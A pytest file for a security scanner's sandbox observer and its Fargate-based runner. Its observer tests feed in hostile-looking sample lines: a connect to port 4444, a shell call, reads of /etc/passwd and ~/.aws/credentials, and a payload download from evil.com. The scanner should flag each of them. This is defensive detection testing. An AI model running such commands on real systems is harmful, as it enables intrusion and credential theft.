"""
Sandbox tests.
Observer tests use real signal matching.
Runner tests mock Fargate ECS calls — no Docker or AWS credentials needed.
"""

from datetime import datetime, timezone
from unittest.mock import patch

import pytest

from scanner.models.sandbox import SandboxEventType
from scanner.sandbox.observer import observe
from scanner.sandbox.runner import run


# ==============================================================================
# OBSERVER TESTS
# ==============================================================================

def test_observe_network_connect():
    output = "socket.connect(('192.168.1.1', 4444))"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.NETWORK_CONNECT for e in events)
    assert any(e.suspicious for e in events)


def test_observe_shell_execution():
    output = "subprocess.run(['/bin/sh', '-c', 'id'], shell=True)"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.SHELL_EXECUTION for e in events)
    assert any(e.suspicious for e in events)


def test_observe_secret_access():
    output = "open('/etc/passwd', 'r')"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.SECRET_ACCESS for e in events)


def test_observe_aws_credentials_access():
    output = "reading ~/.aws/credentials"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.SECRET_ACCESS for e in events)
    assert any(e.suspicious for e in events)


def test_observe_unexpected_download():
    output = "urllib.request.urlretrieve('http://evil.com/payload', '/tmp/p')"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.UNEXPECTED_DOWNLOAD for e in events)


def test_observe_file_delete():
    output = "os.remove('/workspace/important.py')"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.FILE_DELETE for e in events)
    assert any(e.suspicious for e in events)


def test_observe_privilege_escalation():
    output = "os.setuid(0)  # trying to become root"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.PRIVILEGE_ESCALATION for e in events)


def test_observe_clean_output_no_suspicious():
    output = "Hello world\nCalculation complete\nDone."
    events = observe("art-001", output)
    assert all(not e.suspicious for e in events)


def test_observe_empty_output():
    assert observe("art-001", "") == []


def test_observe_blank_lines_ignored():
    output = "\n\n   \n\n"
    assert observe("art-001", output) == []


def test_observe_detail_capped_at_300_chars():
    long_line = "subprocess.run(" + "x" * 400 + ")"
    events = observe("art-001", long_line)
    assert len(events) > 0
    for e in events:
        assert len(e.detail) <= 300


def test_observe_artifact_id_set_on_all_events():
    output = "subprocess.run(['ls'])\nos.remove('/tmp/x')"
    events = observe("art-xyz", output)
    for e in events:
        assert e.artifact_id == "art-xyz"


# ==============================================================================
# RUNNER TESTS
# Runner now triggers Fargate — mock boto3 ECS and DynamoDB calls
# ==============================================================================

import os
os.environ.setdefault("FARGATE_CLUSTER_ARN", "arn:aws:ecs:us-east-1:123:cluster/test")
os.environ.setdefault("FARGATE_TASK_DEF_ARN", "arn:aws:ecs:us-east-1:123:task-definition/sandbox:1")
os.environ.setdefault("FARGATE_SUBNET_ID", "subnet-abc123")
os.environ.setdefault("FARGATE_SECURITY_GROUP_ID", "sg-abc123")
os.environ.setdefault("SANDBOX_RESULTS_TABLE", "test-sandbox-results")
os.environ.setdefault("AWS_DEFAULT_REGION", "us-east-1")
os.environ.setdefault("AWS_ACCESS_KEY_ID", "test")
os.environ.setdefault("AWS_SECRET_ACCESS_KEY", "test")


def _make_report(artifact_id="art-001", executed=True, suspicious_count=0, events=None):
    from scanner.models.sandbox import SandboxReport
    from datetime import datetime, timezone
    return SandboxReport(
        artifact_id=artifact_id,
        executed=executed,
        exit_code=0 if executed else None,
        events=events or [],
        suspicious_event_count=suspicious_count,
        timestamp=datetime.now(timezone.utc),
    )


def test_runner_success_clean_output():
    with patch("scanner.sandbox.runner._ecs") as mock_ecs, \
         patch("scanner.sandbox.runner._get_sandbox_result", return_value=_make_report()):
        mock_ecs.return_value.run_task.return_value = {
            "tasks": [{"taskArn": "arn:aws:ecs:us-east-1:123:task/abc"}],
            "failures": [],
        }
        mock_ecs.return_value.describe_tasks.return_value = {
            "tasks": [{"lastStatus": "STOPPED"}]
        }
        report = run("art-001", "")

    assert report.executed is True
    assert report.execution_error is None


def test_runner_fargate_start_failure_returns_report():
    with patch("scanner.sandbox.runner._ecs") as mock_ecs:
        mock_ecs.return_value.run_task.side_effect = RuntimeError("ECS unavailable")
        report = run("art-001", "")

    assert report.executed is False
    assert "Failed to start Fargate task" in report.execution_error


def test_runner_fargate_task_failure_returns_report():
    with patch("scanner.sandbox.runner._ecs") as mock_ecs:
        mock_ecs.return_value.run_task.return_value = {
            "tasks": [],
            "failures": [{"reason": "RESOURCE:MEMORY"}],
        }
        report = run("art-001", "")

    assert report.executed is False
    assert "RESOURCE:MEMORY" in report.execution_error


def test_runner_missing_env_vars_returns_report():
    import scanner.sandbox.runner as runner_mod
    original = runner_mod.os.environ.get
    # Simulate missing env vars by patching all([cluster, task_def, subnet, sg]) to False
    with patch.dict("os.environ", {
        "FARGATE_CLUSTER_ARN": "",
        "FARGATE_TASK_DEF_ARN": "",
        "FARGATE_SUBNET_ID": "",
        "FARGATE_SECURITY_GROUP_ID": "",
    }):
        report = run("art-001", "")

    assert report.executed is False
    assert "not configured" in report.execution_error


def test_runner_no_report_written_returns_graceful():
    with patch("scanner.sandbox.runner._ecs") as mock_ecs, \
         patch("scanner.sandbox.runner._get_sandbox_result", return_value=None):
        mock_ecs.return_value.run_task.return_value = {
            "tasks": [{"taskArn": "arn:aws:ecs:us-east-1:123:task/abc"}],
            "failures": [],
        }
        mock_ecs.return_value.describe_tasks.return_value = {
            "tasks": [{"lastStatus": "STOPPED"}]
        }
        report = run("art-001", "")

    assert report.executed is True
    assert report.execution_error is not None


def test_runner_never_raises():
    with patch("scanner.sandbox.runner._ecs", side_effect=Exception("unexpected")):
        report = run("art-001", "")
    assert report is not None
    assert report.executed is False


def test_runner_suspicious_event_count_matches():
    from scanner.models.sandbox import SandboxEvent, SandboxEventType
    from datetime import datetime, timezone
    events = [
        SandboxEvent(artifact_id="art-001", event_type=SandboxEventType.SHELL_EXECUTION,
                     detail="shell", suspicious=True, timestamp=datetime.now(timezone.utc)),
        SandboxEvent(artifact_id="art-001", event_type=SandboxEventType.FILE_READ,
                     detail="read", suspicious=False, timestamp=datetime.now(timezone.utc)),
    ]
    report = _make_report(suspicious_count=1, events=events)
    assert report.suspicious_event_count == sum(1 for e in report.events if e.suspicious)
